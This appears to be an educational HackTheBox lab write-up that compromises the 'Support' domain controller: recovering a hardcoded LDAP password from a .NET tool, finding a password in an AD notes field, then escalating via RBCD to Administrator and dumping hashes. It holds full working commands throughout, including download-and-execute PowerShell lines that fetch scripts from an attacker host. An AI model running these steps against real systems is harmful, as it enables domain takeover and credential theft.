---
title: "Support"
type: docs
tags:
  - htb
  - windows
  - active-directory
  - dotnet-reversing
  - ldap
  - rbcd
  - beginner-friendly
  - Easy
---

## The short version (plain English)

- The server lets **anyone** read a file share without logging in. On that share is a small custom program, **`UserInfo.exe`**.
- That program looks up staff in the company directory. To do that it has to log in as a directory account — so **the password is hidden inside the program**. We pull it out (three different ways) and get the account **`ldap`**.
- Logged in as `ldap`, we can read a "notes" field on the **`support`** user account. Someone wrote **`support`'s real password in that notes field**.
- `support` is allowed to remote in with PowerShell → that's our first shell and the **user flag**.
- `support` is in a group that was accidentally given **full control over the Domain Controller's computer account**. That one mistake lets us impersonate the **Administrator** and fully own the domain → **root flag**.

| | |
|---|---|
| **What kind of box** | A Windows domain controller (the "boss" server that runs the whole Windows network) |
| **Domain** | `support.htb` |
| **Way in** | Open file share → reverse a program → directory password |
| **Way up** | A bad permission on the Domain Controller (an attack called **RBCD**) |

Throughout this writeup: **command first, output second, then "what this tells us"**. That's the whole method — run something, read the output, decide the next step.

---

## 1. Scanning — what's running?

### Command

```bash
nmap -p- --min-rate 2000 -Pn 10.129.112.159            # find open ports
nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269 10.129.112.159   # identify them
```

### Output

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-03 00:56:18Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0.)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows
```

### What this tells us

This mix of ports is a **fingerprint**. When you see all of these together —

| Port | Service | Plain meaning |
|---|---|---|
| 53 | DNS | name server (domain controllers usually run DNS) |
| 88 | Kerberos | the Windows login/ticket system → **this is a domain** |
| 389 / 636 | LDAP / LDAPS | the directory database (users, groups, computers) |
| 3268 / 3269 | Global Catalog | a directory service **only Domain Controllers have** |
| 445 | SMB | file sharing |
| 135 / 593 | RPC | remote procedure calls (Windows admin plumbing) |

— you are looking at a **Domain Controller**. Nmap also handed us two freebies: the **domain name** is `support.htb` and the **computer name** is `DC`. Put them in your hosts file so names resolve:

```bash
echo '10.129.112.159 support.htb dc.support.htb DC' | sudo tee -a /etc/hosts
```

> **Being quiet:** a full `-p-` scan is noisy (hundreds of connections in a second). On a real job you'd scan just the ports above, slowly. On HTB nobody's watching, so scan away.

---

## 2. The open file share

### Command

```bash
# "-N" = no password / anonymous.  "-L" = list shares.
smbclient -L //support.htb/ -N
```

### Output

```
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        support-tools   Disk      support staff tools     <-- not normal
        SYSVOL          Disk      Logon server share
```

### What this tells us

`ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `SYSVOL` are on **every** Windows domain controller — ignore them. **`support-tools` is custom.** Someone created it on purpose, and we could list it **without a password**, which is already a misconfiguration.

Quick check — does *any* fake username work?

```bash
nxc smb support.htb -u 'thisuserdoesnotexist' -p ''
```

```
SMB  10.129.112.159  445  DC  [+] support.htb\thisuserdoesnotexist: (Guest)
```

The `(Guest)` at the end is the giveaway: the server didn't check a real account, it just logged us in as the built-in **Guest** account. Guest is supposed to be **disabled** — here it's on, which is why anonymous access works.

### Look inside the share

```bash
smbclient //support.htb/support-tools -N -c 'ls'
```

```
  7-ZipPortable_21.01.paf.exe
  npp.8.4.1.portable.x64.zip
  putty.exe
  SysinternalsSuite.zip
  UserInfo.exe.zip              A   277499
  windirstat1_1_2_setup.exe
  WiresharkPortable64_3.6.5.paf.exe
```

Everything here is a well-known free tool you can download anywhere — **except `UserInfo.exe.zip`**. That's home-made software written by the company's admins. Home-made software that talks to the directory almost always contains a **password**. Grab it:

```bash
smbclient //support.htb/support-tools -N -c 'get UserInfo.exe.zip'
unzip UserInfo.exe.zip -d UserInfo
```

---

## 3. Getting the password out of `UserInfo.exe`

### 3.1 First, what *is* this file?

```bash
file UserInfo/UserInfo.exe
```

```
UserInfo/UserInfo.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
```

`Mono/.Net assembly` is the important part. It means this program was written in **C#** and compiled to **.NET bytecode**, not raw machine code. Why we care: **.NET bytecode turns back into readable C# almost perfectly.** We don't have to be reverse-engineering wizards — a decompiler hands us the source code.

> Tools like Ghidra are for *machine code*. For .NET you use **`monodis`**, **ILSpy**, or **dnSpy**. Using Ghidra here wastes hours — the box is practically daring you to try.

Peek at the text strings inside it:

```bash
strings UserInfo/UserInfo.exe | grep -iE 'password|ldap|base64'
```

```
getPassword
enc_password
FromBase64String
LdapQuery
```

`getPassword`, `enc_password` ("encrypted password"), `FromBase64String`, `LdapQuery` — the program clearly has a **stored, scrambled password** it uses to talk to **LDAP** (the directory). Now let's read exactly how.

### 3.2 Set up the tools (one time)

```bash
sudo apt install -y mono-complete dotnet-sdk-8.0
dotnet tool install -g ilspycmd --version 8.2.0.7535
export PATH="$PATH:$HOME/.dotnet/tools"
```

> **Don't bother with Wine.** Running `wine UserInfo.exe` needs a 32-bit Wine package that, on Ubuntu 24.04, tries to uninstall Python and core system tools to install itself. `mono` runs .NET programs directly and we don't even need to *run* it for the static approach.

### 3.3 Way 1 — read the bytecode (`monodis`)

```bash
monodis UserInfo/UserInfo.exe | grep -A45 'getPassword'
```

```
.method public static default string getPassword ()  cil managed
{
    IL_0000:  ldsfld    string Protected::enc_password
    IL_0005:  call      int8[] System.Convert::FromBase64String(string)      // step 1: base64 decode
    ...
    IL_0015:  ldelem.u1                                                      // take one byte
    IL_0016:  ldsfld    int8[] Protected::key
    IL_0023:  rem                                                           // index % key length
    IL_0024:  ldelem.u1
    IL_0025:  xor                                                           // step 2: XOR with the key
    IL_0026:  ldc.i4    223
    IL_002b:  xor                                                           // step 3: XOR with 223 (0xDF)
    ...
}
```

And the part that sets the stored values:

```
IL_0000:  ldstr   "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"     // enc_password
IL_000f:  ldstr   "armando"                                             // the key
```

**In plain words:** take the text `0Nv32PTw...`, base64-decode it, then for every byte: XOR it with the letters of `"armando"` (looping), then XOR it with the number 223. That's the whole "encryption". **`armando` is the key, not a username** — a very common misread on this box.

### 3.4 Way 2 — get the actual C# back (ILSpy)

```bash
DOTNET_ROLL_FORWARD=LatestMajor ilspycmd UserInfo/UserInfo.exe -o src/
cat src/UserInfo.decompiled.cs
```

```csharp
internal class Protected
{
    private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
    private static byte[] key = Encoding.ASCII.GetBytes("armando");

    public static string getPassword()
    {
        byte[] array = Convert.FromBase64String(enc_password);
        for (int i = 0; i < array.Length; i++)
            array[i] = (byte)((array[i] ^ key[i % key.Length]) ^ 0xDF);
        return Encoding.Default.GetString(array);
    }
}

internal class LdapQuery
{
    public LdapQuery()
    {
        string password = Protected.getPassword();
        // logs into the directory as "support\ldap" with that password:
        entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
        ...
    }
}
```

Now it's crystal clear: the program logs into the directory as **`support\ldap`** using whatever `getPassword()` returns.

> **Why programmers do this (and why it never works):** the admin wanted help-desk staff to look people up without knowing the directory password, so they hid it in the app and "encrypted" it. But the key is *right next to* the scrambled password in the same file — anyone with the file can reverse it. This is hiding, not security.

### 3.5 Un-scramble it

```bash
python3 -c '
import base64
enc = base64.b64decode("0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E")
key = b"armando"
print(bytes(enc[i] ^ key[i % len(key)] ^ 0xDF for i in range(len(enc))).decode())
'
```

```
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

### 3.6 Way 3 — don't reverse anything, just watch it log in

You can skip all the crypto. The program logs into LDAP, and a basic LDAP login sends the password **in plain text over the network**. So: start a packet capture, run the program, read the password off the wire.

```bash
# terminal 1 — record traffic to the directory
sudo tcpdump -i tun0 -s0 -w ldap.pcap 'tcp port 389 and host support.htb'

# terminal 2 — run the program (mono runs .NET on Linux)
cd UserInfo && mono UserInfo.exe find -first raven -last clifton -v
```

```
[*] LDAP query to use: (&(givenName=raven)(sn=clifton))
[-] Exception: No Such Object
```

(The "No Such Object" error is just Mono being incomplete — it fails on the *search*, but the *login* already happened, which is all we need.)

```bash
tcpdump -nnX -r ldap.pcap 'dst host support.htb and greater 100'
```

```
0x0040:  7375 7070 6f72 745c 6c64 6170 8024 6e76  support\ldap.$nv
0x0050:  4566 454b 3136 5e31 614d 3424 6537 4163  EfEK16^1aM4$e7Ac
0x0060:  6c55 6638 7824 7452 5778 5057 4f31 256c  lUf8x$tRWxPWO1%l
0x0070:  6d7a                                     mz
```

Right there in the packet: `support\ldap` and the password `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`. (In Wireshark: filter `ldap.bindRequest` or right-click → Follow → TCP Stream.) Same answer, no maths.

### 3.7 Check the credential works

```bash
nxc ldap support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```

```
LDAP  10.129.112.159  389  DC  [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

The `[+]` (green) means the login worked. **We now have a real domain account.**

---

## 4. Using the `ldap` account to find the next password

### 4.1 List all the users

```bash
nxc ldap support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --users
```

```
[*] Enumerated 20 domain users: support.htb
-Username-           -Last PW Set-        -Description-
Administrator        2022-07-19 17:55:56  Built-in account for administering the computer/domain
Guest                2022-05-28 11:18:55  Built-in account for guest access to the computer/domain
krbtgt               2022-05-28 11:03:43  Key Distribution Center Service Account
ldap                 2022-05-28 11:11:46
support              2022-05-28 11:12:00
smith.rosario        2022-05-28 11:12:19
hernandez.stanley    2022-05-28 11:12:34
...
ford.victoria        2022-05-28 11:15:58
```

Two accounts stand out: `ldap` (that's us) and **`support`** (matches the box name and the tool name).

### 4.2 The trick: read the "notes" fields

Active Directory lets **any logged-in user read almost every field on every account** — including free-text fields like **`info`** (shown as "Notes" in the Windows admin GUI) and `description`. Admins treat these as private scratchpads. They are not private. Sweep them all:

```bash
ldapsearch -x -H ldap://support.htb -D 'support\ldap' \
  -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b 'DC=support,DC=htb' '(objectClass=user)' sAMAccountName info description \
  | grep -iE '^(sAMAccountName|info|description):'
```

```
sAMAccountName: support
info: Ironside47pleasure40Watchful
sAMAccountName: smith.rosario
...
```

There it is — the `support` account has **`info: Ironside47pleasure40Watchful`**. That looks exactly like a password someone parked in the notes field.

### 4.3 Look closer at the `support` account

```bash
ldapsearch -x -H ldap://support.htb -D 'support\ldap' \
  -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b 'DC=support,DC=htb' '(sAMAccountName=support)' memberOf info
```

```
dn: CN=support,CN=Users,DC=support,DC=htb
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
```

Two useful facts:
- **`Remote Management Users`** — this group is allowed to remote in with PowerShell (WinRM). That's our way to a shell.
- **`Shared Support Accounts`** — a custom group. Custom groups exist to *grant* something. We'll dig into it for privilege escalation.

### 4.4 Confirm the password + shell access

```bash
nxc winrm support.htb -u support -p 'Ironside47pleasure40Watchful'
```

```
WINRM  10.129.112.159  5985  DC  [+] support.htb\support:Ironside47pleasure40Watchful (Pwn3d!)
```

`(Pwn3d!)` = we can get a shell.

---

## 5. Foothold — shell as `support`

```bash
evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'
```

```
*Evil-WinRM* PS C:\Users\support\Documents> whoami
support\support

*Evil-WinRM* PS C:\Users\support\Desktop> type user.txt
<user flag>
```

**Why WinRM specifically?** `support` isn't an administrator anywhere, so tools like `psexec` won't work. But it *is* in `Remote Management Users`, and that group's entire job is "allowed to connect over WinRM (port 5985)". Right tool for the permission we have.

### 5.1 First thing in any Windows shell: look around

Before downloading any scripts, run the built-in commands. They're already there, they're quiet, and they often hand you the answer.

**Who am I and what can I do?**

```powershell
*Evil-WinRM* PS> whoami /groups
```

```
Group Name                                 Type    SID
========================================== ======= =============================================
BUILTIN\Remote Management Users            Alias   S-1-5-32-580
BUILTIN\Users                              Alias   S-1-5-32-545
BUILTIN\Pre-Windows 2000 Compatible Access Alias   S-1-5-32-554
NT AUTHORITY\Authenticated Users           Well..  S-1-5-11
SUPPORT\Shared Support Accounts            Group   S-1-5-21-1677581083-3380853377-188903654-1103
```

```powershell
*Evil-WinRM* PS> whoami /priv
```

```
Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

**Stop and read that.** `SeMachineAccountPrivilege — Add workstations to domain — Enabled`. That single line tells us **this account is allowed to create computer accounts in the domain.** We didn't know that yet from the Linux side. That is *exactly* one of the two ingredients the final attack needs — and here it is, in a one-word built-in command, before we've touched a script. (The other, `MachineAccountQuota`, we confirm in §6.)

**The password policy** (matters if you ever need to guess/spray passwords):

```powershell
*Evil-WinRM* PS> net accounts
```

```
Minimum password length:                              7
Lockout threshold:                                    Never
Lockout duration (minutes):                           30
Computer role:                                        PRIMARY
```

`Lockout threshold: Never` means you could brute-force accounts all day without locking anyone out. `Computer role: PRIMARY` re-confirms this is the main Domain Controller.

**What my account looks like in the directory** (note the group memberships at the bottom):

```powershell
*Evil-WinRM* PS> net user support /domain
```

```
User name                    support
Password last set            5/28/2022 4:12:00 AM
Local Group Memberships      *Remote Management Use
Global Group memberships     *Shared Support Accoun *Domain Users
```

**Poke around the file system** — anything non-standard at the root of C: is worth a look:

```powershell
*Evil-WinRM* PS> Get-ChildItem C:\ -Force | Select Name
```

```
Program Files
Program Files (x86)
ProgramData
Users
Windows
share                <-- not standard
```

```powershell
*Evil-WinRM* PS> cmd /c "dir C:\share /s"
```

```
 Directory of C:\share
05/28/2022  04:18 AM    <DIR>          support-tools
```

`C:\share` is just the local copy of the `support-tools` SMB share we already looted — a dead end, but you *check*, because "weird folder at C:\ root" is a classic hiding spot.

Nothing in our token is "admin". Every road points back to one thing: **`Shared Support Accounts`**.

---

## 6. Finding the privilege escalation

This is the part people find confusing, so we go slowly: **run a command, look at the output, understand what it means.**

### 6.0 Cast a wide net first

Before zeroing in, dump *everything* the `ldap` account can see and skim it. There are several tools for this and they overlap on purpose — if one is blocked or buggy, another gets you the same facts.

**`ldapdomaindump` — one command, whole directory to browsable HTML:**

```bash
mkdir ldd && cd ldd
ldapdomaindump -u 'SUPPORT\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' ldap://10.129.112.159
```

```
[+] Bind OK
[+] Domain dump finished
```

```bash
ls
```

```
domain_computers.html   domain_groups.html   domain_policy.html   domain_users.html
domain_users_by_group.html   domain_users.grep   domain_groups.grep   ...
```

Open `domain_users_by_group.html` in a browser and you can *see* that `support` is the only member of `Shared Support Accounts`. Check the policy file for the machine-account quota:

```bash
cat domain_policy.grep
```

```
distinguishedName   ...   minPwdLength   pwdProperties        ms-DS-MachineAccountQuota
DC=support,DC=htb    ...   7              PASSWORD_COMPLEX     10
```

There's `MachineAccountQuota: 10` again — this dump already contains it.

**`nxc` LDAP modules — quick targeted questions:**

```bash
LP='nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
nxc ldap support.htb -u ldap -p "$LP" --groups           # every group + member count
nxc ldap support.htb -u ldap -p "$LP" --admin-count      # accounts/groups flagged as privileged
nxc ldap support.htb -u ldap -p "$LP" --kerberoasting kerb.txt   # crackable service accounts
nxc ldap support.htb -u ldap -p "$LP" --asreproast asrep.txt     # accounts with no Kerberos pre-auth
nxc ldap support.htb -u ldap -p "$LP" --gmsa             # managed service-account passwords we can read
```

```
--- kerberoasting ---
LDAP  ...  No entries found!
--- asreproast ---
LDAP  ...  No entries found!
--- gmsa ---
LDAP  ...  [-] LDAPS not configured
```

**All three come back empty.** That's useful information, not a failure — it *rules out* the three most common AD shortcuts (crack a service account, roast an AS-REP, read a gMSA password), which tells us the path must be a **permission (ACL) issue**. That's what points us at BloodHound.

**Every notes field in the domain, in one go:**

```bash
ldapsearch -x -H ldap://support.htb -D 'support\ldap' -w "$LP" -b 'DC=support,DC=htb' \
  '(objectClass=user)' sAMAccountName description info comment \
  | grep -iE '^(sAMAccountName|description|info|comment):'
```

```
sAMAccountName: support
info: Ironside47pleasure40Watchful
sAMAccountName: smith.rosario
...
```

(This is how we found `support`'s password back in §4 — worth repeating here because it's the #1 thing to do with any new AD credential.)

**Full raw attribute dump of the interesting account** — sometimes the clue is a field you didn't think to ask for:

```bash
ldapsearch -x -H ldap://support.htb -D 'support\ldap' -w "$LP" \
  -b 'CN=support,CN=Users,DC=support,DC=htb'
```

```
cn: support
company: support
streetAddress: Skipper Bowles Dr
l: Chapel Hill
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
userAccountControl: 66048        # = NORMAL_ACCOUNT + DONT_EXPIRE_PASSWORD
primaryGroupID: 513
```

### 6.1 What's special about `Shared Support Accounts`?

Who's in it?

```bash
ldapsearch -x -H ldap://support.htb -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b 'DC=support,DC=htb' '(cn=Shared Support Accounts)' member
```

```
dn: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
member: CN=support,CN=Users,DC=support,DC=htb
```

Just `support` (us). So whatever power this group has, **we have it.**

### 6.2 What can this group *do*? Ask BloodHound

BloodHound collects every permission in the domain and draws a map of "who can attack whom". Collect the data (from Linux, using the `ldap` account):

```bash
bloodhound-python -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -d support.htb -ns 10.129.112.159 -c All --zip
```

```
INFO: Found AD domain: support.htb
INFO: Getting TGT for user
INFO: Found 2 computers
INFO: Found 21 users
INFO: Found 53 groups
INFO: Done in 00M 06S
INFO: Compressing output into 20260902224945_bloodhound.zip
```

Load that zip into the BloodHound app, mark `support` as **Owned**, and run **"Shortest Path to Domain Admins from Owned Principals"**. The map shows:

```
support  ──MemberOf──▶  SHARED SUPPORT ACCOUNTS  ──GenericAll──▶  DC.SUPPORT.HTB  (the Domain Controller's computer account)
```



**`GenericAll` means "full control".** Our group has full control over the **computer account of the Domain Controller itself**. That is a critical mistake by whoever set up this domain.

If you'd rather collect from *inside* the Windows shell, upload the `SharpHound.exe` collector (from the [BloodHound GitHub releases](https://github.com/SpecterOps/BloodHound)) and run it there, then `download` the zip:

```powershell
*Evil-WinRM* PS> upload SharpHound.exe
*Evil-WinRM* PS> .\SharpHound.exe -c All --outputdirectory C:\Users\support\Desktop --zipfilename b
*Evil-WinRM* PS> download C:\Users\support\Desktop\<timestamp>_b.zip
```

### 6.3 Prove it without BloodHound (three ways)

BloodHound is just reading permissions off the directory — you can read them yourself.

**Way A — `dacledit.py` (impacket), from Linux.** "DACL" = the permissions list on an object, exactly like right-click → Properties → Security on a file, but for an Active Directory object:

```bash
dacledit.py -action read -principal 'Shared Support Accounts' \
  -target-dn 'CN=DC,OU=Domain Controllers,DC=support,DC=htb' \
  'support.htb/ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -dc-ip 10.129.112.159
```

```
[*] Parsing DACL
[*] Filtering results for SID (S-1-5-21-1677581083-3380853377-188903654-1103)
[*]   ACE[15] info
[*]     ACE Type      : ACCESS_ALLOWED_ACE
[*]     Access mask   : FullControl (0xf01ff)
[*]     Trustee (SID) : Shared Support Accounts (S-1-5-21-1677581083-3380853377-188903654-1103)
```

`Access mask : FullControl` on the DC's object, granted to `Shared Support Accounts`. Confirmed.

**Way B — PowerView (`PowerView.ps1` from [PowerSploit / GitHub](https://github.com/PowerShellMafia/PowerSploit)), from the Windows shell.** PowerView is the classic PowerShell toolkit for asking the directory precise questions:

```powershell
*Evil-WinRM* PS> upload PowerView.ps1
*Evil-WinRM* PS> Import-Module .\PowerView.ps1

# what does our group have rights over?
*Evil-WinRM* PS> $g = Get-DomainGroup 'Shared Support Accounts'
*Evil-WinRM* PS> Get-DomainObjectAcl -SearchBase "DC=support,DC=htb" -ResolveGUIDs |
                  ? { $_.SecurityIdentifier -eq $g.objectsid }
```

```
AceType               : AccessAllowed
ObjectDN              : CN=DC,OU=Domain Controllers,DC=support,DC=htb
ActiveDirectoryRights : GenericAll
SecurityIdentifier    : S-1-5-21-1677581083-3380853377-188903654-1103
```

```powershell
# or let PowerView find every "interesting" ACL in the domain automatically
*Evil-WinRM* PS> Find-InterestingDomainAcl -ResolveGUIDs |
                  ? { $_.IdentityReferenceName -eq 'Shared Support Accounts' } |
                  select ObjectDN, ActiveDirectoryRights
```

```
ObjectDN                                            ActiveDirectoryRights
--------                                            ---------------------
CN=DC,OU=Domain Controllers,DC=support,DC=htb        GenericAll
```

**Way C — `bloodhound-python` JSON, no GUI.** The collector already wrote the answer to disk; just grep the computers file:

```bash
python3 -c "
import json,glob
for c in json.load(open(glob.glob('*computers.json')[0]))['data']:
    for a in c.get('Aces',[]):
        if a['RightName']=='GenericAll':
            print(c['Properties']['name'], '<--', a['PrincipalSID'])
"
```

```
DC.SUPPORT.HTB <-- S-1-5-21-1677581083-3380853377-188903654-1103   (Shared Support Accounts)
DC.SUPPORT.HTB <-- S-1-5-21-1677581083-3380853377-188903654-512    (Domain Admins - normal)
DC.SUPPORT.HTB <-- S-1-5-21-1677581083-3380853377-188903654-519    (Enterprise Admins - normal)
```

Three tools, same fact: **`Shared Support Accounts` sits in that list next to Domain Admins and Enterprise Admins — where it absolutely should not be.**

### 6.4 Can we create a computer account? Check it two ways

The attack we're about to do (RBCD, explained next) needs us to **create a new computer account** in the domain. Regular users can do this *if* a setting called **`ms-DS-MachineAccountQuota`** is above 0. Check it:

```bash
nxc ldap support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -M maq
```

```
MAQ  10.129.112.159  389  DC  [*] Getting the MachineAccountQuota
MAQ  10.129.112.159  389  DC  MachineAccountQuota: 10
```

Or read the same setting straight off the domain:

```bash
ldapsearch -x -H ldap://support.htb -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b 'DC=support,DC=htb' -s base '(objectClass=*)' ms-DS-MachineAccountQuota
```

```
dn: DC=support,DC=htb
ms-DS-MachineAccountQuota: 10
```

**`10`** means every normal user (including `support`) is allowed to add up to 10 computer accounts to the domain. That's the default, and it's the second ingredient we need.

And remember §5.1 — from the shell, `whoami /priv` already showed us the matching privilege on the account itself:

```
SeMachineAccountPrivilege     Add workstations to domain     Enabled
```

So both checks agree: **`support` can create computer accounts.** You can also confirm from PowerShell:

```powershell
*Evil-WinRM* PS> Get-ADObject "DC=support,DC=htb" -Properties ms-DS-MachineAccountQuota |
                  Select ms-DS-MachineAccountQuota
```

```
ms-DS-MachineAccountQuota
------------------------
                      10
```

### 6.5 So the plan is

We now have **both ingredients** for an attack called **Resource-Based Constrained Delegation (RBCD)**:

1. **Full control over the Domain Controller's computer account** (from the group), and
2. **The ability to create a computer account** (from `MachineAccountQuota = 10`).

---

## 7. Privilege escalation — RBCD, step by step

### 7.1 What RBCD actually is (simple version)

"Delegation" in Windows means: *service A is allowed to act as you when talking to service B.* Normally only admins can set this up.

**RBCD** changes *who* configures it: the **target** service keeps a list — an attribute called `msDS-AllowedToActOnBehalfOfOtherIdentity` — of "accounts allowed to impersonate people to me". **Editing that list only needs write access to the target object.** We have *full* access to the DC's object, so we can add ourselves to its list.

Once we're on the DC's list, our computer account can ask Kerberos: *"give me a ticket to the DC, and make it say I'm the Administrator."* Kerberos checks the list, sees us, and says yes.

### 7.2 Sync your clock first

Kerberos rejects requests if your clock is more than 5 minutes off the server.

```bash
sudo ntpdate -u support.htb        # or: sudo rdate -n support.htb
```

### 7.3 Step 1 — create a computer account

```bash
addcomputer.py -computer-name 'RBCDDEMO$' -computer-pass 'Passw0rd123!' \
  -dc-ip 10.129.112.159 'support.htb/support:Ironside47pleasure40Watchful'
```

```
Impacket v0.9.25 - Copyright 2021 SecureAuth Corporation

[*] Successfully added machine account RBCDDEMO$ with password Passw0rd123!.
```

That worked **because `MachineAccountQuota` was 10.** We now control a computer account, `RBCDDEMO$`.

### 7.4 Step 2 — add our computer to the DC's "allowed to impersonate" list

```bash
rbcd.py -delegate-from 'RBCDDEMO$' -delegate-to 'DC$' -action write \
  -dc-ip 10.129.112.159 'support.htb/support:Ironside47pleasure40Watchful'
```

```
[*] Accounts allowed to act on behalf of other identity:
[*]     (none)
[*] Delegation rights modified successfully!
[*] RBCDDEMO$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     RBCDDEMO$    (S-1-5-21-1677581083-3380853377-188903654-6102)
```

That worked **because `support` has full control over `DC$`** (via the group). The DC now trusts `RBCDDEMO$` to impersonate anyone to it.

### 7.5 Step 3 — get an Administrator ticket for the DC

```bash
getST.py -spn 'cifs/dc.support.htb' -impersonate 'Administrator' \
  -dc-ip 10.129.112.159 'support.htb/RBCDDEMO$:Passw0rd123!'
```

```
[*] Getting TGT for user
[*] Impersonating Administrator
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

`cifs/dc.support.htb` = the file-sharing service on the DC. We now have a **Kerberos ticket that says we are `Administrator`**, saved to `Administrator.ccache`.

### 7.6 Step 4 — use the ticket

```bash
export KRB5CCNAME=Administrator.ccache        # tell tools to use that ticket

wmiexec.py -k -no-pass dc.support.htb whoami
wmiexec.py -k -no-pass dc.support.htb hostname
wmiexec.py -k -no-pass dc.support.htb 'type C:\Users\Administrator\Desktop\root.txt'
```

```
support\administrator
dc
<root flag>
```

**`support\administrator` on `dc`** — full control of the Domain Controller, which means full control of the entire Windows network.

### 7.7 (Optional) Grab all the password hashes

With Administrator on the DC you can dump every account's password hash ("DCSync"):

```bash
secretsdump.py -k -no-pass -just-dc-user 'support\Administrator' dc.support.htb
secretsdump.py -k -no-pass -just-dc-user 'support\krbtgt' dc.support.htb
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26:::
Administrator:aes256-cts-hmac-sha1-96:f5301f54fad85ba357fb859c94c5c31a6abe61f6db1986c03574bfd6c2e31632
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6303be52e22950b5bcb764ff2b233302:::
```

That `bb06cbc0...` is the Administrator's password hash. You can log in with just the hash (no password needed) — "pass-the-hash":

```bash
nxc smb support.htb -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26'
```

```
SMB  10.129.112.159  445  DC  [+] support.htb\Administrator:bb06cbc02b39abeddd1335bc30b19e26 (Pwn3d!)
```

### 7.8 Clean up after yourself

You added things to the domain — remove them (use the Administrator hash you just got):

```bash
ADM='aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26'

rbcd.py -action flush -delegate-to 'DC$' -dc-ip 10.129.112.159 'support.htb/Administrator' -hashes "$ADM"
addcomputer.py -computer-name 'RBCDDEMO$' -delete -dc-ip 10.129.112.159 'support.htb/Administrator' -hashes "$ADM"
```

```
[*] Delegation rights flushed successfully!
[*] Successfully deleted RBCDDEMO$.
```

Verify it's clean:

```bash
ldapsearch -x -H ldap://support.htb -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b 'DC=support,DC=htb' '(objectClass=computer)' sAMAccountName
```

```
sAMAccountName: DC$
```

Only the real DC computer is left. Good.

---

## 8. Doing the same attack from a Windows shell (alternative)

If you're already in the `support` PowerShell session and would rather stay there:

```powershell
# 1. create the computer account
IEX(New-Object Net.WebClient).DownloadString('http://10.10.x.x/Powermad.ps1')
New-MachineAccount -MachineAccount RBCDDEMO -Password (ConvertTo-SecureString 'Passw0rd123!' -AsPlainText -Force)

# 2. write the DC's "allowed to impersonate" list
IEX(New-Object Net.WebClient).DownloadString('http://10.10.x.x/PowerView.ps1')
$sid = (Get-DomainComputer RBCDDEMO).objectsid
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;GA;;;$sid)"
$b   = New-Object byte[] ($sd.BinaryLength); $sd.GetBinaryForm($b,0)
Get-DomainComputer DC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$b}

# 3. + 4. get and use the ticket
.\Rubeus.exe hash /password:Passw0rd123! /user:RBCDDEMO$ /domain:support.htb
.\Rubeus.exe s4u /user:RBCDDEMO$ /rc4:<hash-from-above> /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /ptt
dir \\dc.support.htb\c$
```

Same three ideas: make a computer, edit the DC's list, ask for an Administrator ticket.

---

## 9. The enumeration toolbox — GitHub scripts, step by step

